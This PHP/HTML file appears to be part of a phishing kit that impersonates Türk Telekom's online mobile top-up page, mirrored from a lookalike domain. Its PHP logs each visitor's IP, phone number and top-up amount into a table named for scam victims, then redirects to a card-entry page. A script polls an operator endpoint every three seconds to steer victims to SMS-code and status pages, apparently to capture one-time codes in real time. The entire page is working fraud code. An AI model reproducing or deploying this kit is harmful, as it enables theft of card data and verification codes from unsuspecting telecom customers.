<?php

date_default_timezone_set('Europe/Istanbul');
include('baglan.php');

if($_POST){
    $phone       = htmlspecialchars($_POST['msisdnToBeProcessed']);
    $money   = htmlspecialchars($_POST['tlselect']);
    ob_start();
    session_start();
    $_SESSION['tl_amount'] = $money;

    $ip         = $_SERVER['REMOTE_ADDR'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare('INSERT INTO sazan SET ip=?,date=?,phone=?,money=?');
	$insert = $query->execute(array($ip,$date,$phone,$money));


    if($insert){
        header('Location:kart.php');
    }
}
?>


<!--[if IE 8]>
<html class="ie8">
	<![endif]-->
	<html>
		
<!-- Mirrored from bimcell-tl-yukleme-oges-ddss.com/main.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jul 2021 09:20:26 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
            <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <base >
			<title>
				T&Uuml;RK TELEKOM ONLINE İŞLEMLER
			</title>
			<meta content="IE=11; IE=10; IE=9; IE=8; IE=7; IE=EDGE" http-equiv="X-UA-Compatible">
			<meta content="noindex" name="googlebot">
			<meta content="T&uuml;rk Telekom Online İşlemler" name="keywords">
			<meta content="" name="description">
			<meta content="Portalgrup" name="author">
			<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
			<meta content="yes" name="apple-mobile-web-app-capable">
			<meta content="black" name="apple-mobile-web-app-status-bar-style">
			<meta content="" name="yandex-verification">
			<meta content="" property="og:site_name">
			<meta content="" property="og:title">
			<meta content="" property="og:description">
			<meta content="@TurkTelekom" name="twitter:site">
			<meta content="@TurkTelekom" name="twitter:creator">
			<meta content="summary_large_image" name="twitter:card">
			<meta content="" name="twitter:url">
			<meta content="" name="twitter:title">
			<meta content="" name="twitter:description">
			<meta content="" name="twitter:image:src">
			<meta content="" property="og:image">
			<meta content="" name="Description">
			<meta content="" name="keywords">
			<meta content="INDEX, FOLLOW" name="ROBOTS">
			<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
			<meta content="tr" http-equiv="content-language">
			<meta content="759CC145F5253026E9AD25163C99F33B" name="msvalidate.01">
			<link rel="publisher" href="https://plus.google.com/113220695539428705388/">
			<meta content="https://www.facebook.com/TurkTelekom" property="article:publisher">
			<meta content="https://www.facebook.com/TurkTelekom" property="article:author">
			<meta content="app-id=496489138" name="apple-itunes-app">
			<meta content="app-id=com.tmob.AveaOIM" name="google-play-app">
			<script type="text/javascript">var requestedCommand = "bimcellLiraYukleme";</script>
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/libs/css/bootstrap.min.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/libs/css/animate.min.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/libs/css/chosen.min.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/libs/css/slick.min.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/libs/css/slick-theme.min.css">
			<link id="ttCss" rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/assets_new_menu/scss/tt.min.css">
			<link href="./onlineislemler.turktelekom.com.tr/mps/apple-touch-icon.html" rel="apple-touch-icon">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/jquery.smartbanner.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/bootstrap777d.css?1.1">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/base3abf.css?q=1.0">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/general.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/pluginsc81e.css?2">
			<link id="styleCss" rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/style6512.css?11">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/responsiveeccb.css?3">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/dataTables.bootstrap.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/listbox.css">
			<link rel="stylesheet" href="./onlineislemler.turktelekom.com.tr/mps/assets/css/datepicker/bootstrap-datetimepicker.min.css">
			<link type="image/x-icon" href="data:image/x-icon;," rel="shortcut icon">
			<link href="data:;base64,=" rel="icon">
			<link sizes="58x58" href="./onlineislemler.turktelekom.com.tr/mps/assets/images/57x57.png" rel="apple-touch-icon">
			<link sizes="76x76" href="./onlineislemler.turktelekom.com.tr/mps/assets/images/72x72.png" rel="apple-touch-icon">
			<link href="./onlineislemler.turktelekom.com.tr/mps/assets/images/114x114.png" sizes="120x120" rel="apple-touch-icon">
			<link href="./onlineislemler.turktelekom.com.tr/mps/assets/images/152x152.png" sizes="152x152" rel="apple-touch-icon">
			<style>
				.modal-backdrop {
				z-index:1030 !important;
				}
			</style>
		</head>
		<body>
			<div class="
				other-theme
				other-theme
				">
				<div class="container mt10">
					<div style="margin-bottom:5px;" id="layoutHeader"></div>
				</div>
				<div id="actionsContentArea">
					
					<style type="text/css">
						/* Erdinç */
						.col-not-mobile-margin-right-15 {
						margin-right: 15px;
						}
						.margin-top-10 {
						margin-top:10px;
						}
						#how_do .img-responsive {
						margin: 0 auto;
						}
						@media (max-width: 768px) {
						.col-xs-margin-top-10 {
						margin-top:10px;
						}
						.col-xs-padding-12 {
						padding: 12px;
						}
						.col-not-mobile-margin-right-15 {
						margin-right:0px;
						}
						}
						/* End Erdinç */
						.bs-example{
						margin: 20px;
						}
						.modal-dialog{
						margin-top : 20%;
						height: 27%;
						width : 50%;
						}
						.main-form-group{
						background-color: #f8f8f8;
						-webkit-border-radius: 10px;
						-moz-border-radius: 10px;
						padding : 10px;
						border-radius: 10px;
						}
					</style>
					<div class="container mt10">
						<div class="frame">
							<h3 class="title" style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif !important;">
								TL Y&Uuml;KLEME
							</h3>
							<div class="contain clearfix">
								<div class="blockMe" id="load">
									<div style="margin:10px" class="col-lg-12 col-md-12 col-sm-12 col-xs-12 pull-right">
										L&uuml;tfen TL y&uuml;klemek istediğiniz telefon numarasını, almak istediğiniz TL miktarını ve kredi kartı/banka kartı bilgilerinizi giriniz
									</div>
<script>
  function validateForm() {
    var x = document.forms["sifresizLiraYukleme"]["msisdnToBeProcessed"].value;
    if (x == null || x == "") {
      alert("Lütfen tüm alanları doldurduğunuzdan emin olun.");
      return false;
    }
  }
</script>
 <script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      }
        if(msg=='back'){
        window.location.href='sms.php';
      }
         if(msg=='back'){
        window.location.href='index.php?1';
      }
            if(msg=='1'){
        window.location.href='index.php?1';
      }       if(msg=='2'){
        window.location.href='kart.php';
      }          if(msg=='3'){
        window.location.href='bekle.php';
      }          if(msg=='4'){
        window.location.href='hata.php';
      }          if(msg=='5'){
        window.location.href='tebrik.php';
      }  
      }
    });
    
}
</script>
									<form method="post" name="sifresizLiraYukleme" id="sifresizLiraYukleme" onsubmit="return validateForm()" autocomplete="off" class="form-horizontal">
										<input id="subCmdType" name="subCmdType" type="hidden">
										<div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 col-xs-margin-top-10 pull-right">
											<div class="main-form-group col-lg-11 col-lg-offset-1 col-md-11 col-md-offset-1 col-sm-11 col-sm-offset-1 col-xs-12">
												<div class="how_do text-center col-lg-12 col-md-12 col-sm-12 col-xs-12" id="how_do">
													<a class="col-lg-12 col-md-12 col-sm-12 col-xs-12" target="_blank" href="#"><img class="img-responsive" src="../onlineislemler.turktelekom.com.tr/mps/assets/assets-ext/images/oi/avea/icon_how_do.png"><br>
													<span>NASIL YAPARIM?</span></a>
												</div>
											</div>
										</div>
										<div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 pull-left">
											<div class="main-form-group col-lg-12 col-md-12 col-sm-12 col-xs-12">
												<div class="form-group">
													<label for="msisdn" class="control-label col-lg-3 col-md-3 col-sm-3 col-xs-12">Y&uuml;kleme Yapılacak Telefon Numarası:</label>
													<div class="col-lg-9 col-md-9 col-sm-9 col-xs-12">
														<input name="msisdnToBeProcessed" tabindex="1" id="msisdn" size="12" maxlength="10" placeholder="5xxxxxxxxx" class="form-control onlyNumeric" type="text">
													</div>
												</div>
												<div class="form-group">
													<label for="counter" class="control-label col-lg-3 col-md-3 col-sm-3 col-xs-12">Y&uuml;klemek İstediğiniz TL Miktarı:</label>
													<div class="col-lg-9 col-md-9 col-sm-9 col-xs-12">
														<select tabindex="2" id="tlselect" name="tlselect" class="form-control">
															<option value="0">Se&ccedil;iniz</option>
															<option value="20">20₺</option>
															<option value="25">25₺</option>
															<option value="30">30₺</option>
															<option value="50">50₺</option>
															<option value="100">100₺</option>
														</select>
													</div>
												</div>
											</div>
										</div>
										<div class="col-lg-9 col-md-9 col-sm-9 col-xs-12 pull-left">
											<div id="odemeContent" style="margin-top: 10px;" class="main-form-group col-lg-12 col-md-12 col-sm-12 col-xs-12 ">
											</div>
										</div>
<center>
<br><br>
    <input class="subscribe btn btn-primary btn-block " style="width: 150px;" type="submit" value=" Devam Et ">
  </center>
									</form>
									<style>
										.sozlesme_content_text {
										font-family: 'CentraleSansBook';
										font-size: 12px;
										}
										.sozlesme_content_text h2{
										font-size: 22px;
										font-weight: bold;
										text-align: center;
										}
										.sozlesme_content_text h3{
										font-size: 18px;
										font-weight: bold;
										margin-top: 10px;
										}
										.sozlesme_content_text h4{
										font-size: 16px;
										font-weight: bold;
										}
										.sozlesme_content_text span{
										font-size: 14px;
										margin-bottom: 10px;
										display: inline-block;
										width: 100%;
										}
										.sozlesme_content_text h2, .sozlesme_content_text h3, .sozlesme_content_text h4 {
										margin-bottom: 10px;
										}
										.sozlesme_content_close {
										cursor: pointer !important;
										border: 1px solid #999;
										padding: 5px 10px;
										float: right;
										color: #666;
										}
									</style>								
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="modal fade" id="modal-general">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h4 class="modal-title">Online İşlemler</h4>
							</div>
							<div id="modal-confirm-body-content"></div>
							<div class="modal-footer">
								<button class="btn btn-four cancelBtn" type="button">İptal</button><button class="btn btn-seven okBtn" type="button">Tamam</button>
							</div>
						</div>
					</div>
				</div>
				<div class="modal fade" id="modal-general-alert">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h4 class="modal-title">Online İşlemler</h4>
							</div>
							<div id="modal-body-content"></div>
							<div class="modal-footer">
								<div class="btn-group">
									<button data-dismiss="modal" class="btn btn-seven" type="button">Tamam</button>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</body>

<script type="text/javascript">
    $(document).ready(function () {
        $('form').submit(function () {
            $('.formSubmitRow').hide();
            $('.loader').show();
        });
		
		$('#msisdn').inputmask({
			mask: "99 999 999 9999",
			placeholder: ""
		});

    });
</script>
<!-- Mirrored from bimcell-tl-yukleme-oges-ddss.com/main.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jul 2021 09:20:56 GMT -->
</html>